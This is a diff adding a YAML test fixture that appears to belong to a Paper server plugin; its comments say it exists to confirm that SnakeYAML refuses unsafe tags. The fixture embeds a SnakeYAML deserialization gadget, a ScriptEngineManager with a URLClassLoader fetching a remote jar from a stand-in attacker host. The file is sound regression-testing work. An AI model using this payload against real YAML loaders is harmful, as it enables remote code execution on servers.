@@ -1,0 +1,17 @@
+# T044 fixture — asserts Paper's bundled SnakeYAML 2.x refuses non-safe tags.
+# This file MUST never successfully load via YamlConfiguration.loadFromString.
+# If a future Paper upgrade relaxes SafeConstructor to allow these tags,
+# ConfigServiceTest#maliciousYamlTagIsRefusedBySnakeYaml will fail at build time
+# and alert us to the regression before it reaches operators.
+github:
+  repo: "owner/repo-name"
+  token: !!java.net.URL "http://evil.example.com/pwn"
+  commit-author-name: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL "http://evil.example.com/x.jar"]]]
+  commit-author-email: "tickstatssync@example.com"
+
+server:
+  name: "my-server"
+  stats-path: "/tmp/does-not-matter-parsing-must-fail-before-this"
+
+sync:
+  cron: "0 */6 * * *"
